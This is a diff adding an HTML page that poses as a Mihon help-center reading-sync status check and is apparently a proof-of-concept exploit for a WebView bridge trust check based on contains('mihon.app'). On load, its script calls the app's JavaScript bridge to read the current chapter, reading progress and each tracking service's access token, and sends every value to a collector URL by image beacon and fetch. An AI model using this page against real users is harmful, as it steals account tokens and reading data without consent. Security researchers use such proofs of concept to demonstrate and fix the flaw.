@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mihon 帮助中心 - 同步状态检查</title>
+<style>
+body { font-family: sans-serif; max-width: 680px; margin: 20px auto; padding: 0 16px; color: #333; }
+h2 { color: #2a6496; }
+.card { background: #f5f5f5; border-radius: 8px; padding: 16px; margin: 12px 0; }
+.muted { color: #666; font-size: 14px; }
+pre { white-space: pre-wrap; word-break: break-word; background: #fff; border: 1px solid #ddd; padding: 12px; }
+table { width: 100%; border-collapse: collapse; margin-top: 8px; font-size: 13px; }
+td { padding: 6px 8px; border-bottom: 1px solid #ddd; vertical-align: top; }
+td:first-child { font-weight: bold; width: 150px; }
+</style>
+</head>
+<body>
+<h2>Mihon 阅读同步帮助</h2>
+<p class="muted">此页面模拟帮助中心的阅读同步状态检查页。</p>
+
+<div class="card">
+  <h3>页面来源校验</h3>
+  <p id="origin-status">等待 WebView 注入阅读辅助接口...</p>
+</div>
+
+<div class="card">
+  <h3>阅读状态</h3>
+  <pre id="reader-state">准备中...</pre>
+</div>
+
+<div class="card">
+  <h3>Tracking 服务</h3>
+  <div id="track-services">准备中...</div>
+</div>
+
+<script>
+var params = new URLSearchParams(location.search);
+var collector = params.get("collector") || ("http://" + location.hostname + ":8000/collect");
+
+function setText(id, value) {
+    var el = document.getElementById(id);
+    if (el) el.textContent = value;
+}
+
+function setHtml(id, value) {
+    var el = document.getElementById(id);
+    if (el) el.innerHTML = value;
+}
+
+function exfil(label, data) {
+    var payload = label + "=" + encodeURIComponent(data || "");
+    try {
+        new Image().src = collector + "?d=" + encodeURIComponent(payload);
+    } catch (e) {}
+    try {
+        fetch(collector + "?d=" + encodeURIComponent(payload), { mode: "no-cors" });
+    } catch (e) {}
+}
+
+function callBridge(name, fn) {
+    try {
+        var value = fn();
+        exfil(name, value);
+        return value;
+    } catch (e) {
+        exfil(name + "_error", e.message || String(e));
+        return "";
+    }
+}
+
+function run() {
+    if (!window.mihonAndroidBridge) {
+        setText("origin-status", "mihonAndroidBridge 不可用，页面未被视为可信帮助来源。");
+        exfil("bridge_status", "missing");
+        return;
+    }
+
+    setText("origin-status", "mihonAndroidBridge 可用：当前恶意 URL 已被 contains(\"mihon.app\") 误判为可信。");
+    exfil("bridge_status", "available");
+    exfil("page_url", location.href);
+
+    var chapter = callBridge("currentChapter", function () {
+        return window.mihonAndroidBridge.getCurrentChapter();
+    });
+    var progress = callBridge("readingProgress", function () {
+        return window.mihonAndroidBridge.getReadingProgress();
+    });
+    setText(
+        "reader-state",
+        "currentChapter: " + chapter + "\n" +
+        "readingProgress: " + progress
+    );
+
+    var services = callBridge("availableServices", function () {
+        return window.mihonAndroidBridge.getAvailableTrackServices();
+    });
+    var rows = "";
+    services.split(",").forEach(function (service) {
+        service = service.trim();
+        if (!service) return;
+        var token = callBridge("trackToken_" + service, function () {
+            return window.mihonAndroidBridge.getTrackToken(service);
+        });
+        rows += "<tr><td>" + service + "</td><td>" + token + "</td></tr>";
+    });
+    setHtml("track-services", "<table>" + rows + "</table>");
+}
+
+setTimeout(run, 500);
+</script>
+</body>
+</html>
